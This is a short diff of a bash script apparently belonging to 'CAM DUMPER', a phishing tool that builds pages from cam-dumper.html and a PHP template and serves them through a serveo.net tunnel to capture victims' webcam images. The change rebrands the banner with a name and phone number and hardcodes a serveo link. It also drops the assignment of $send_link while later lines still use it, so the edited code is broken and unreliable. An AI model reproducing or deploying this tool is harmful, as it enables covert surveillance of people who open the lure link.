@@ -33,7 +33,7 @@ printf "                 [|]          \n"
 printf "              \_______/       \n"
 printf "               v     v        \n"
 printf "                ^___^         \n"
-printf "\e[1;92m   𝗖𝗔𝗠 𝗗𝗨𝗠𝗣𝗘𝗥      \e[0m\n"
+printf "\e[1;92m   JCSCRIPT (99) 9173-5588    \e[0m\n"
 
 
 printf " \e[1;77m tool created by KOMIK3R ,LiNuX-Mallu\e[0m \n"
@@ -250,7 +250,8 @@ fi
 
 payload() {
 
-send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
+novo_link="https://meulink.serveo.net"
+sed -i "s|https://[0-9a-zA-Z.-]*\.serveo.net|$novo_link|g" sendlink
 
 sed 's+forwarding_link+'$send_link'+g' cam-dumper.html > index2.html
 sed 's+forwarding_link+'$send_link'+g' template.php > index.php
